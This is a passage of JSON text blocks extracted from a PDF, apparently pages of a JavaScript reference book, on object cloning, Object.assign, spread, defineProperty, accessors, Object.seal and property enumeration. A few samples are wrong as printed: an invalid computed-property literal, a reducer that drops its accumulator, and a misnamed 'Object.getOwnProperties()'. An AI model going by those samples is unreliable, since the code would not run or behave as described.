        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Nested objects are not frozen",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. bar . push ( 4 ); obj. baz . foo   =   'new foo' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.3: Object cloning",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When you want a complete copy of an object (i.e. the object properties and the values inside those properties, etc...), that is called  deep cloning .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "If an object can be serialized to JSON, then you can create a deep clone of it with a combination of  JSON. parse  and",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON. stringify : var  existing  =   {  a :   1 ,  b :   {  c :   2   }   }; var  copy  =  JSON. parse ( JSON. stringify ( existing ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "existing. b . c   =   3 ;   // copy.b.c will not change",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that  JSON. stringify  will convert  Date  objects to ISO-format string representations, but  JSON. parse  will not convert the string back into a  Date . There is no built-in function in JavaScript for creating deep clones, and it is not possible in general to create deep clones for every object for many reasons. For example, objects can have non-enumerable and hidden properties which cannot be detected. object getters and setters cannot be copied. objects can have a cyclic structure. function properties can depend on state in a hidden scope. Assuming that you have a \"nice\" object whose properties only contain primitive values, dates, arrays, or other \"nice\" objects, then the following function can be used for making deep clones. It is a recursive function that can detect objects with a cyclic structure and will throw an error in such cases.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 114",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  deepClone ( obj )   {      function  clone ( obj ,  traversedObjects )   {          var  copy ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // primitive types",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if ( obj  ===   null   ||   typeof  obj  !==   \"object\" )   {              return  obj ;          }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // detect cycles",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         for ( var  i  =   0 ;  i  <  traversedObjects. length ;  i ++)   {              if ( traversedObjects [ i ]   ===  obj )   {                  throw   new  Error ( \"Cannot clone circular object.\" );              }          }          // dates          if ( obj  instanceof  Date )   {             copy  =   new  Date ();             copy. setTime ( obj. getTime ());              return  copy ;          }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // arrays",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if ( obj  instanceof  Array )   {             copy  =   [];              for ( var  i  =   0 ;  i  <  obj. length ;  i ++)   {                 copy. push ( clone ( obj [ i ],  traversedObjects. concat ( obj )));              }              return  copy ;          }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // simple objects",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if ( obj  instanceof  Object )   {             copy  =   {};              for ( var  key  in  obj )   {                  if ( obj. hasOwnProperty ( key ))   {                     copy [ key ]   =  clone ( obj [ key ],  traversedObjects. concat ( obj ));                  }              }              return  copy ;          }          throw   new  Error ( \"Not a cloneable object.\" );      }      return  clone ( obj ,   []); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.4: Object properties iteration",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can access each property that belongs to an object with this loop",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for   ( var  property  in  object )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // always check if an object has a property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( object. hasOwnProperty ( property ))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // do stuff",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You should include the additional check for  hasOwnProperty  because an object may have properties that are inherited from the object's base class. Not performing this check can raise errors.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 115",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "You can also use  Object. keys  function which return an Array containing all properties of an object and then you can loop through this array with  Array. map  or  Array. forEach  function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   0 :   'a' ,   1 :   'b' ,   2 :   'c'   }; Object. keys ( obj ) . map ( function ( key )   {     console. log ( key ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// outputs: 0, 1, 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.5: Object.assign",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Object.assign()  method is used to copy the values of all enumerable own properties from one or more source objects to a target object. It will return the target object. Use it to assign values to an existing object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  user  =   {     firstName :   \"John\" }; Object. assign ( user ,   { lastName :   \"Doe\" ,  age : 39 });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( user );   // Logs: {firstName: \"John\", lastName: \"Doe\", age: 39}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or to create a shallow copy of an object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =  Object. assign ({},  user );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj );   // Logs: {firstName: \"John\", lastName: \"Doe\", age: 39}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or merge many properties from multiple objects to one:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj1  =   {     a :   1 }; var  obj2  =   {     b :   2 }; var  obj3  =   {     c :   3 }; var  obj  =  Object. assign ( obj1 ,  obj2 ,  obj3 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj );   // Logs: { a: 1, b: 2, c: 3 } console. log ( obj1 );   // Logs: { a: 1, b: 2, c: 3 }, target object itself is changed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Primitives will be wrapped, null and unde\ufb01ned will be ignored:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  var_1  =   'abc' ; var  var_2  =   true ; var  var_3  =   10 ; var  var_4  =  Symbol ( 'foo' ); var  obj  =  Object. assign ({},  var_1 ,   null ,  var_2 ,   undefined ,  var_3 ,  var_4 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj );   // Logs: { \"0\": \"a\", \"1\": \"b\", \"2\": \"c\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note, only string wrappers can have own enumerable properties",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 116",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use it as reducer: (merges an array to an object)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "return  users. reduce (( result ,  user )   =>  Object. assign ({},   {[ user. id ]:  user })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.6: Object rest/spread (...)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version > 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Object spreading is just syntactic sugar for  Object. assign ({},  obj1 ,  ... ,  objn ); It is done with the  ...  operator:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj  =   {  a :   1   }; let  obj2  =   {  ... obj ,  b :   2 ,  c :   3   };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj2 );   // { a: 1, b: 2, c: 3 };",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As  Object. assign  it does  shallow  merging, not deep merging.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj3  =   {  ... obj ,  b :   {  c :   2   }   };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj3 );   // { a: 1, b: { c: 2 } };",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NOTE :  This speci\ufb01cation  is currently in  stage 3",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.7: Object.de\ufb01neProperty",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "It allows us to de\ufb01ne a property in an existing object using a property descriptor.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   }; Object. defineProperty ( obj ,   'foo' ,   {  value :   'foo'   }); console. log ( obj. foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output foo Object. defineProperty  can be called with the following options:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. defineProperty ( obj ,   'nameOfTheProperty' ,   {   value :  valueOfTheProperty ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  writable :   true ,   // if false, the property is read-only   configurable  :   true ,   // true means the property can be changed later   enumerable  :   true   // true means property can be enumerated such as in a for..in loop });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperties  allows you to de\ufb01ne multiple properties at a time.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 117",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. defineProperties ( obj ,   {   property1 :   {     value :   true ,     writable :   true    },   property2 :   {     value :   'Hello' ,     writable :   false    }        });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.8: Accesor properties (get and set)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Treat a property as a combination of two functions, one to get the value from it, and another one to set the value in it. The  get  property of the property descriptor is a function that will be called to retrieve the value from the property. The  set  property is also a function, it will be called when the property has been assigned a value, and the new value will be passed as an argument. You cannot assign a  value  or  writable  to a descriptor that has  get  or  set",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  person  =   {  name :   \"John\" ,  surname :   \"Doe\" }; Object. defineProperty ( person ,   'fullName' ,   {      get :   function   ()   {          return   this . name   +   \" \"   +   this . surname ;      },      set :   function   ( value )   {          [ this . name ,   this . surname ]   =  value. split ( \" \" );      } }); console. log ( person. fullName );   // -> \"John Doe\" person. surname   =   \"Hill\" ; console. log ( person. fullName );   // -> \"John Hill\" person. fullName   =   \"Mary Jones\" ; console. log ( person. name )   // -> \"Mary\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.9: Dynamic / variable property names",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes the property name needs to be stored into a variable. In this example, we ask the user what word needs to be looked up, and then provide the result from an object I've named  dictionary .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  dictionary  =   {     lettuce :   'a veggie' ,     banana :   'a fruit' ,     tomato :   'it depends on who you ask' ,     apple :   'a fruit' ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    Apple :   'Steve Jobs rocks!'   // properties are case-sensitive }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  word  =  prompt ( 'What word would you like to look up today?' ) var  definition  =  dictionary [ word ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 118",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "alert ( word  +   ' \\n\\n '   +  definition )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note how we are using  []  bracket notation to look at the variable named  word ; if we were to use the traditional  . notation, then it would take the value literally, hence:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( dictionary. word )    // doesn't work because word is taken literally and dictionary has no field named `word` console. log ( dictionary. apple )   // it works! because apple is taken literally console. log ( dictionary [ word ])   // it works! because word is a variable, and the user perfectly typed in one of the words from our dictionary when prompted console. log ( dictionary [ apple ])   // error! apple is not defined (as a variable)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You could also write literal values with  []  notation by replacing the variable  word  with a string  'apple' . See [Properties with special characters or reserved words] example. You can also set dynamic properties with the bracket syntax:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  property = \"test\" ; var  obj ={   [ property ]= 1 ; }; console. log ( obj. test ); //1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It does the same as:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  property = \"test\" ; var  obj ={}; obj [ property ]= 1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.10: Arrays are Objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Disclaimer:  Creating array-like objects is not recommend. However, it is helpful to understand how they work, especially when working with DOM. This will explain why regular array operations don't work on DOM objects returned from many DOM  document  functions. (i.e.  querySelectorAll ,  form. elements ) Supposing we created the following object which has some properties you would expect to see in an Array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  anObject  =   {     foo :   'bar' ,     length :   'interesting' ,      '0' :   'zero!' ,      '1' :   'one!' };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then we'll create an array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  anArray  =   [ 'zero.' ,   'one.' ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now, notice how we can inspect both the object, and the array in the same way.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( anArray [ 0 ],  anObject [ 0 ]);   // outputs: zero.  zero! console. log ( anArray [ 1 ],  anObject [ 1 ]);   // outputs: one.  one! console. log ( anArray. length ,  anObject. length );   // outputs: 2 interesting",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 119",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( anArray. foo ,  anObject. foo );   // outputs: undefined bar",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Since  anArray  is actually an object, just like  anObject , we can even add custom wordy properties to  anArray Disclaimer:  Arrays with custom properties are not usually recommended as they can be confusing, but it can be useful in advanced cases where you need the optimized functions of an Array. (i.e. jQuery objects)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "anArray. foo   =   'it works!' ; console. log ( anArray. foo );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can even make  anObject  to be an array-like object by adding a  length .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "anObject. length   =   2 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then you can use the C-style  for  loop to iterate over  anObject  just as if it were an Array. See Array Iteration Note that  anObject  is only an  array-like  object. (also known as a List) It is not a true Array. This is important, because functions like  push  and  forEach  (or any convenience function found in  Array. prototype ) will not work by default on array-like objects. Many of the DOM  document  functions will return a List (i.e.  querySelectorAll ,  form. elements ) which is similar to the array-like  anObject  we created above. See Converting Array-like Objects to Arrays",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( typeof  anArray  ==   'object' ,   typeof  anObject  ==   'object' );   // outputs: true  true console. log ( anArray  instanceof  Object ,  anObject  instanceof  Object );   // outputs: true  true console. log ( anArray  instanceof  Array ,  anObject  instanceof  Array );   // outputs: true  false console. log ( Array. isArray ( anArray ),  Array. isArray ( anObject ));   // outputs: true  false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.11: Object.seal",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Object. seal  prevents the addition or removal of properties from an object. Once an object has been sealed its property descriptors can't be converted to another type. Unlike  Object. freeze  it does allow properties to be edited. Attempts to do this operations on a sealed object will fail silently",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {  foo :   'foo' ,  bar :   function   ()   {   return   'bar' ;   }   }; Object. seal ( obj ) obj. newFoo   =   'newFoo' ; obj. bar   =   function   ()   {   return   'foo'   }; obj. newFoo ;   // undefined obj. bar ();   // 'foo'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Can't make foo an accessor property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( obj ,   'foo' ,   {      get :   function   ()   {   return   'newFoo' ;   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "});   // TypeError // But you can make it read only",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( obj ,   'foo' ,   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 120",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    writable :   false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "});   // TypeError",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "obj. foo   =   'newFoo' ; obj. foo ;   // 'foo';",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode these operations will throw a  TypeError",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function   ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     'use strict' ;      var  obj  =   {  foo :   'foo'   };     Object. seal ( obj );     obj. newFoo   =   'newFoo' ;   // TypeError }());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.12: Convert object's values to array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Given this object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {     a :   \"hello\" ,     b :   \"this is\" ,     c :   \"javascript!\" , };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can convert its values to an array by doing:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =  Object. keys ( obj )     . map ( function ( key )   {          return  obj [ key ];      });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( array );   // [\"hello\", \"this is\", \"javascript!\"]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 13.13: Retrieving properties from an object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Characteristics of properties :",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Properties that can be retrieved from an  object  could have the following characteristics, Enumerable Non - Enumerable own While creating the properties using  Object.de\ufb01neProperty(ies) , we could set its characteristics except  \"own\" . Properties which are available in the direct level not in the  prototype  level ( __proto__ ) of an object are called as  own properties. And the properties that are added into an object without using  Object. defindProperty ( ies )  will don't have its enumerable characteristic. That means it be considered as true.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Purpose of enumerability :",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The main purpose of setting enumerable characteristics to a property is to make the particular property's",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 121",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "availability when retrieving it from its object, by using di\ufb00erent programmatical methods. Those di\ufb00erent methods will be discussed deeply below.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Methods of retrieving properties :",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Properties from an object could be retrieved by the following methods,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for .. in  loop 1.",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This loop is very useful in retrieving enumerable properties from an object. Additionally this loop will retrieve enumerable own properties as well as it will do the same retrieval by traversing through the prototype chain until it sees the prototype as null.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Ex 1 : Simple data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,  b  :   3 }   ,  props  =   []; for ( prop  in  x ){   props. push ( prop ); } console. log ( props );   //[\"a\",\"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 2 : Data with enumerable properties in prototype chain",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,   __proto__   :   {  b  :   10   }}   ,  props  =   []; for ( prop  in  x ){   props. push ( prop ); } console. log ( props );   //[\"a\",\"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 3 : Data with non enumerable properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   }   ,  props  =   []; Object. defineProperty ( x ,   \"b\" ,   { value  :   5 ,  enumerable  :   false }); for ( prop  in  x ){   props. push ( prop ); } console. log ( props );   //[\"a\"] Object. keys ()  function 2.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This function was unveiled as a part of ECMAScript 5. It is used to retrieve enumerable own properties from an object. Prior to its release people used to retrieve own properties from an object by combining  for .. in",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "loop and  Object. prototype . hasOwnProperty ()  function.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 1 : Simple data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,  b  :   3 }   ,  props ; props  =  Object. keys ( x ); console. log ( props );   //[\"a\",\"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 2 : Data with enumerable properties in prototype chain",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,   __proto__   :   {  b  :   10   }}   ,  props ; props  =  Object. keys ( x );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 122",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( props );   //[\"a\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 3 : Data with non enumerable properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   }   ,  props ; Object. defineProperty ( x ,   \"b\" ,   { value  :   5 ,  enumerable  :   false }); props  =  Object. keys ( x ); console. log ( props );   //[\"a\"] Object. getOwnProperties ()  function 3.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This function will retrieve both enumerable and non enumerable, own properties from an object. It was also released as a part of ECMAScript 5.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Ex 1 : Simple data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,  b  :   3 }   ,  props ; props  =  Object. getOwnPropertyNames ( x ); console. log ( props );   //[\"a\",\"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 2 : Data with enumerable properties in prototype chain",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   ,   __proto__   :   {  b  :   10   }}   ,  props ; props  =  Object. getOwnPropertyNames ( x ); console. log ( props );   //[\"a\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Ex 3 : Data with non enumerable properties",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   {  a  :   10   }   ,  props ; Object. defineProperty ( x ,   \"b\" ,   { value  :   5 ,  enumerable  :   false }); props  =  Object. getOwnPropertyNames ( x ); console. log ( props );   //[\"a\", \"b\"]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Miscellaneous :",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A technique for retrieving all (own, enumerable, non enumerable, all prototype level) properties from an object is given below,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getAllProperties ( obj ,  props  =   []){    return  obj  ==   null   ?  props  :            getAllProperties ( Object. getPrototypeOf ( obj ),                props. concat ( Object. getOwnPropertyNames ( obj ))); } var  x  =   { a : 10 ,   __proto__   :   {  b  :   5 ,  c  :   15   }};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//adding a non enumerable property to first level prototype",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object. defineProperty ( x. __proto__ ,   \"d\" ,   { value  :   20 ,  enumerable  :   false }); console. log ( getAllProperties ( x ));   [ \"a\" ,   \"b\" ,   \"c\" ,   \"d\" ,   \"...other default core props...\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And this will be supported by the browsers which supports ECMAScript 5.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 123",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.14: Read-Only property",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
